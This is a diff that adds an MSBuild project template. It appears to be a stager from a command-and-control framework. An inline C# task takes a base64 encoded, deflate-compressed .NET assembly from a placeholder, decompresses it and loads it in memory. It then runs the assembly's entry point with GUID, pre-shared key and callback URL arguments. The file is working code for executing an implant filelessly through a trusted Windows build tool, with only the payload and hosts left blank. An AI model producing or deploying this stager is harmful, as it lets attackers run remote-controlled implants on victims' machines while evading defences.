@@ -1,0 +1,51 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="NAME_GOES_HERE">
+    <NAME_GOES_HERE >
+    </NAME_GOES_HERE>
+  </Target>
+  <UsingTask
+    TaskName="NAME_GOES_HERE"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Using Namespace="System.Reflection" />
+      <Using Namespace="System.IO" />
+      <Using Namespace="System.IO.Compression" />
+
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+
+        string guid = "GUID";
+        string psk = "PSK";
+        string urls = "URLS";
+        string b64 = "BASE64_ENCODED_ASSEMBLY";
+
+        string[] args = new string[] { guid, psk, urls };
+        byte[] compressed = System.Convert.FromBase64String(b64);
+        using (MemoryStream inputStream = new MemoryStream(compressed.Length))
+        {
+            inputStream.Write(compressed, 0, compressed.Length);
+            inputStream.Seek(0, SeekOrigin.Begin);
+            using (MemoryStream outputStream = new MemoryStream())
+            {
+                using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
+                {
+                    byte[] buffer = new byte[4096];
+                    int bytesRead;
+                    while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
+                    {
+                        outputStream.Write(buffer, 0, bytesRead);
+                    }
+                }
+
+              Assembly a = Assembly.Load(outputStream.ToArray());
+              a.EntryPoint.Invoke(null, new object[] { args });
+            }
+          }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
